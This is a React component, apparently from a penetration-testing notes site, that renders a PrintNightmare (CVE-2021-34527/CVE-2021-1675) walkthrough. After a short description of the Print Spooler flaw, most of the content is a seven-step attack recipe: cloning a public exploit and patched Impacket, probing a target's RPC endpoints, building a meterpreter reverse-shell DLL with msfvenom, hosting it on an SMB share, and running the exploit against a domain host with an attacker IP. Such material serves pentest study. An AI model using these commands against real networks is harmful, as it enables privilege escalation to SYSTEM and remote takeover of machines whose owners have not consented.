import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const PrintNightmare = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              PrintNightmare is the nickname given to two vulnerabilities
              (CVE-2021-34527) and (CVE-2021-1675) found in the Print Spooler
              service that runs on all Windows operating systems. This
              vulnerability allows a credentialed domain user to escalate
              privileges to domain admin. The PrintSpooler service is a service
              on Windows which allows printing. It is mainly used for managing
              print jobs which are sent to a print server from a client. The
              PrintSpooler service runs inside a process called `spoolsv.exe`.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              The vulnerability in the PrintSpooler service is an authorization
              bypass bug which allows anyone to install print drivers using RPC
              function `RpcAddPrintDriverEx()`. We can use this vulnerability to
              inject a malicious driver that will run in the context of
              `spoolsv.exe` which is SYSTEM level privilege.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Clone the repository.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"git clone https://github.com/cube0x0/CVE-2021-1675.git"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              For this exploit to work successfully, we will need to use
              cube0x0's version of Impacket.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"pip3 uninstall impacket"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"git clone https://github.com/cube0x0/impacket"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"cd impacket"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"python3 ./setup.py install"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Check of machine is vulnerable by seeing if `Print System
              Asynchronous Protocol` and `Print System Remote Protocol` are
              exposed on the target.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>Craft a reverse shell</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>Host the reverse shell on an SMB share</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "sudo smbserver.py -smb2support CompData /path/to/backupscript.dll"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>Setup the reverse shell listener</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"use exploit/multi/handler"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 7</Typography>
            <Typography>Run the exploit</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "sudo python3 CVE-2021-1675.py {DOAMIN}/{USER}:{PASSWORD}@{IP}'\\\\{ATTACKER_IP}\\path\\to\\backupscript.dll'"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default PrintNightmare;
